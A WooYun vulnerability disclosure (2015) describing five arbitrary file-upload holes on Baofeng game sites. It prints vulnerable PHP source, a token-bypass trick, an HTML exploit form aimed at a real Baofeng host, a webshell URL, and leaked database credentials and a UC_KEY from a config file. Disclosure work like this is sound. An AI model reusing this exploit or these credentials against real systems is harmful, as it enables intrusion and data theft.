{"id": 73298, "wybug_id": "wooyun-2015-0154077", "wybug_title": "暴风影音某站5处任意文件上传导致多站可被Getshell", "wybug_corp": "暴风影音", "wybug_author": "HackBraid", "wybug_date": "2015-11-18 09:29", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述：  详细说明：  01# 起源svn泄露\n\n02# 源码审计构造POC/uploadify/uploadifyGift.php文件\n<?php$targetFolder = '/Public/uploadsGift';$verifyToken = md5('unique_saltdoumicc' . $_POST['timestamp']);//伪造timpstamp字段为1，然后计算md5值为5980c31b4c74da6b3aa25ec99ac1dc1f绕过token限制if (!empty($_FILES) && $_POST['token'] == $verifyToken) {\t$fileext = $_FILES['Filedata']['name'];\t$fileext = explode(\".\", $fileext);\t$fileext = $fileext[1];\t$newFileName  = \"m\" . uniqid() . time(). \".\".$fileext;//$fileext字段可以用x.php.txt来伪造，后面直接echo出文件名来\t$tempFile = $_FILES['Filedata']['tmp_name'];\t$targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;\t$targetFile = rtrim($targetPath,'/') . '/' . $newFileName;\t\t$fileTypes = array('txt');\t$fileParts = pathinfo($_FILES['Filedata']['name']);\t\tif (in_array($fileParts['extension'],$fileTypes)) {//这里用的extension来判断。。\t\tmove_uploaded_file($tempFile,$targetFile);\t\techo $newFileName;\t} else {\t\techo '-1';\t}}?>\n另外四处上传在同级目录下：uploadify.phpuploadifyAdver.phpuploadifyApk.phpuploadifyScreens.php   漏洞证明：  03# EXP经过上面简单的源码分析，构造EXP如下：\n<html><body><form action=\"http://wap.g.baofeng.com/uploadify/uploadifyGift.php\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"Filedata\" id=\"file\" /> <br /><input type=\"text\" name=\"token\" id=\"token\" value=\"5980c31b4c74da6b3aa25ec99ac1dc1f\" /> <br /><input type=\"text\" name=\"timestamp\" id=\"timestamp\" value=\"1\" /> <br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form></body></html>\n04# getshellhttp://wap.g.baofeng.com/Public/uploadsGift/m5629f37eea7cd1445589886.php cc\n\n多个站点可被getshell\n\n\n\n暴风游戏论坛主站为例：http://bbsm.g.baofeng.com/data/avatar/index.php 4\n\n有阿里云，但是漏洞还是得补，比如说我把你配置文件下载下来：\n<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', '10.252.215.80');define('UC_DBUSER', 'CXsdk');define('UC_DBPW', 'CXsdk123456');define('UC_DBNAME', 'bf_bbsm');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`bf_bbsm`.pre_ucenter_');define('UC_DBCONNECT', 0);define('UC_CHARSET', 'utf-8');define('UC_KEY', '6dM7gfz8q5o561p3r9YeK7ces0fd76mclcK882d0m8l4K4u7A55dRcXc17qd70B6');define('UC_API', 'http://bbsm.g.baofeng.com/uc_server');define('UC_APPID', '1');define('UC_IP', '');define('UC_PPP', 20);?>\n   修复方案：  后缀限制   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-18 10:11 厂商回复： 感谢您提交的漏洞，我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-18 09:31 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  秒审？    \n     2015-11-18 09:31 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  秒审？    \n     2015-11-18 09:48 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  非常感谢你报告的漏洞，漏洞无法重现，忽略处理    \n     2015-11-18 09:59 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:909 漏洞数:159        | 沉淀。)\t\t \n  吊吊吊    \n     2015-11-18 10:06 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  @泳少 (ಥ_ಥ)表这样，希望rank给高点，最近缺    \n     2015-11-18 10:13 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1003 漏洞数:232        | 1.乌云最帅的男人                        ...)\t\t \n  @HackBraid @HackBraid 10rank  不谢    \n     2015-11-18 10:49 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  @牛 小 帅 - -！    \n     2015-11-18 11:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1072 漏洞数:181        | px1624)\t\t \n  5处    \n     2015-11-18 11:28 |    \t\tchange \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:15        | 核心白帽子)\t\t \n  @HackBraid 非常感谢你报告的漏洞，漏洞无法重现，忽略处理    \n     2015-11-18 20:25 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:10        | 百里长苏)\t\t \n  牛逼。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}